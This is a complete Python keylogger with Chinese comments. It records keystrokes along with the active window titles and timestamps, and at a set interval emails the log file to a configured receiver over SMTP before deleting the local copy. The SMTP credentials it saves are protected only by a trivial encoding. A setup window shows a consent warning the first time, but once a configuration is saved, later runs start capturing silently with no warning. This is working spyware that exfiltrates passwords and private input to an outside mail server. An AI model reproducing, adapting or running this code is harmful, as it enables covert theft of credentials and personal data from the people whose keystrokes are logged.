# -*- coding : "UTF-8" -*-
import os
from time import strftime, sleep, localtime
from pygetwindow import getActiveWindow
from pynput import keyboard
from smtplib import SMTP_SSL
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
from tkinter import Tk, Label, Entry, Button
from threading import Thread
from tkinter.messagebox import askokcancel
from func_timeout import func_set_timeout


def get_key(key):
    try:
        if key.char:
            key = key.char
        else:
            key = key.vk-96
    except AttributeError:
        pass
    finally:
        save_file()
        with open(f"{work_path}\\logger.txt", "a+", encoding="utf-8") as f:
            f.write(str(key).replace("Key.", "")+" ")


# 获取窗口时间
def get_time():
    return strftime("%Y-%m-%d %H:%M:%S", localtime())


title = []


# 获取窗口标题
def get_title():
    global title, title_temp
    title.append(str(getActiveWindow().title))
    title_temp = str(getActiveWindow().title)


# 判断窗口标题
def save_file():
    global title, title_temp
    get_title()
    with open(f"{work_path}\\logger.txt", "a+", encoding="utf-8") as f:
        if len(title) == 2 and title_temp == title[0]:
            del title[0]
        elif len(title) == 1:
            f.write(f"\n\n[{title_temp} {get_time()}]\n")
        else:
            f.write(f"\n\n[{title_temp} {get_time()}]\n")
            del title[0]


# 配置邮件
def send_email(sender, password, host, port, receiver):
    try:
        con = SMTP_SSL(host, port)
        con.login(sender, password)
        msg = MIMEMultipart()
        subject = Header('Kelogger', 'utf-8').encode()
        msg['Subject'] = subject
        msg['From'] = sender
        file = MIMEText(
            open(f"{work_path}\\logger.txt", 'rb').read(), 'base64', 'utf-8')
        file["Content-Disposition"] = 'attachment; filename="logger.txt"'
        msg.attach(file)
        con.sendmail(sender, receiver, msg.as_string())
        con.quit()
    except:
        askokcancel(title="错误", message="邮件发送失败，请检查并重新输入相关配置。")
        exit()


# 程序退出
def exit():
    os._exit(0)


# 将函数线程化
def thread_it(func, *arg):
    t = Thread(target=func, args=arg)
    t.start()


# 启动按键监听
def key_listener():
    listener = keyboard.Listener(on_press=get_key)
    listener.start()


# 开始监听，发送邮件
def start_button():
    global email_time
    button2["state"] = "disabled"
    if askokcancel(title="警告", message="监听程序即将启动，可能会获取账号、密码等重要私人信息，请确认是否启动？"):
        global sender, password, host, port, receiver, title
        thread_it(key_listener)
        while True:
            sleep(eval(email_time)-5.0)
            if os.path.exists(f"{work_path}\\logger.txt"):

                # 发送邮件线程
                thread_it(send_email, sender, password, host, port, receiver)

                sleep(5)

                # 删除文件，清空标题列表
                thread_it(os.remove(f"{work_path}\\logger.txt"))
                title.clear()


# 开始监听，发送邮件___无警告
def start_button_none_warning():
    global sender, password, host, port, receiver, title, email_time, button2
    thread_it(key_listener)
    while True:
        sleep(eval(email_time)-5.0)
        if os.path.exists(f"{work_path}\\logger.txt"):

            # 发送邮件线程
            thread_it(send_email, sender, password, host, port, receiver)

            sleep(5)

            # 删除文件，清空标题列表
            thread_it(os.remove(f"{work_path}\\logger.txt"))
            title.clear()


# <开始>按键线程化，防止程序阻塞
def start_button_thread():
    round_t = Thread(target=start_button)
    round_t.start()


# 加密信息
def encryption(var):
    enc = list(map(ord, var))
    enc = [i*963852741 for i in enc]
    return enc


# 解密信息
def decryption(var):
    dec = [int(i/963852741) for i in var]
    dec = "".join(list(map(chr, dec)))
    return dec


# 测试端口和发送者邮箱是否正确
@func_set_timeout(5)
def try_email():
    global sender, password, host, port
    SMTP_SSL(host, port).login(sender, password)


# 开始前读取配置文件
def read_config():
    global sender, password, host, port, receiver, email_time
    if os.path.exists(f"{work_path}/config.ini"):
        with open(f"{work_path}\\config.ini", "r") as c:
            sender = decryption(eval(c.readline()))
            password = decryption(eval(c.readline()))
            host = decryption(eval(c.readline()))
            port = decryption(eval(c.readline()))
            receiver = decryption(eval(c.readline()))
            email_time = decryption(eval(c.readline()))
            c.close()
            try:
                try_email()
                return True
            except:
                os.remove(f"{work_path}\\config.ini")
                sender, password, host, port, receiver = "", "", "", "", ""
                email_time = 300
                thread_it(window)
                sleep(0.1)
                if not askokcancel(title="错误", message="邮箱配置有误，请重新输入。"):
                    exit()
                return False
    else:
        sender, password, host, port, receiver = "", "", "", "", ""
        email_time = 300
        thread_it(window)
        return False


# 传递输入框内的参数到相应变量
def get_info():
    global entry1, entry2, entry3, entry4, entry5, entry6, button2
    global sender, password, host, port, receiver, email_time
    sender = entry1.get()
    password = entry2.get()
    host = entry3.get()
    port = entry4.get()
    receiver = entry5.get()
    email_time = entry6.get()
    try:
        try_email()
        save_config()
        button2["state"] = "normal"
    except:
        askokcancel(title="错误", message="邮箱配置有误，请重新输入。")


# 保存配置文件
def save_config():
    global sender, password, host, port, receiver, email_time
    with open(f"{work_path}\\config.ini", "w") as c:
        c.write(str(encryption(sender))+"\n")
        c.write(str(encryption(password))+"\n")
        c.write(str(encryption(host))+"\n")
        c.write(str(encryption(port))+"\n")
        c.write(str(encryption(receiver))+"\n")
        c.write(str(encryption(email_time)))
        askokcancel(title="通知", message="配置保存成功。")


# 定义主窗口
def window():
    global sender, password, host, port, receiver, email_time
    global entry1, entry2, entry3, entry4, entry5, entry6, button2

    root_windows = Tk()

    # 设置主窗口
    screenwidth = root_windows.winfo_screenwidth()
    screenheight = root_windows.winfo_screenheight()
    root_windows.geometry(
        f"270x305+{int((screenwidth-270)/2)}+{int((screenheight-270)/2)}")
    root_windows.resizable(False, False)
    root_windows.title("Keylogger")

    # 发送者标签
    lable1 = Label(root_windows, text="发送者邮箱：")
    lable1.place(x=20, y=20)

    # 发送者输入框
    entry1 = Entry(root_windows, show="*")
    entry1.insert(0, f"{sender}")
    entry1.place(x=100, y=20)

    # 发送者密钥标签
    lable2 = Label(root_windows, text="发送者密钥：")
    lable2.place(x=20, y=60)

    # 发送者密钥输入框
    entry2 = Entry(root_windows, show="*")
    entry2.insert(0, f"{password}")
    entry2.place(x=100, y=60)

    # 服务器标签
    lable3 = Label(root_windows, text="邮箱服务器：")
    lable3.place(x=20, y=100)

    # 服务器输入框
    entry3 = Entry(root_windows, show="*")
    entry3.insert(0, f"{host}")
    entry3.place(x=100, y=100)

    # 端口标签
    lable4 = Label(root_windows, text="服务器端口：")
    lable4.place(x=20, y=140)

    # 端口输入框
    entry4 = Entry(root_windows, show="*")
    entry4.insert(0, f"{port}")
    entry4.place(x=100, y=140)

    # 接收者标签
    lable5 = Label(root_windows, text="接收者邮箱：")
    lable5.place(x=20, y=180)

    # 接收者输入框
    entry5 = Entry(root_windows, show="*")
    entry5.insert(0, f"{receiver}")
    entry5.place(x=100, y=180)

    # 发送邮件时间周期
    lable6 = Label(root_windows, text="间隔（秒）：")
    lable6.place(x=20, y=220)

    # 接收者输入框
    entry6 = Entry(root_windows, show="*")
    entry6.insert(0, f"{email_time}")
    entry6.place(x=100, y=220)

    # 保存按钮
    button1 = Button(root_windows, text="  保存  ", command=get_info)
    button1.place(x=20, y=260)

    # 开始按钮
    button2 = Button(root_windows, text="  开始  ",
                     state="disabled", command=start_button_thread)
    button2.place(x=109, y=260)

    # 退出按钮
    button3 = Button(root_windows, text="  退出  ", command=exit)
    button3.place(x=198, y=260)

    root_windows.mainloop()


# 程序入口
if __name__ == "__main__":
    work_path = "D:\\Logger"
    if not os.path.exists(work_path):
        os.mkdir(work_path)
    if read_config():
        start_button_none_warning()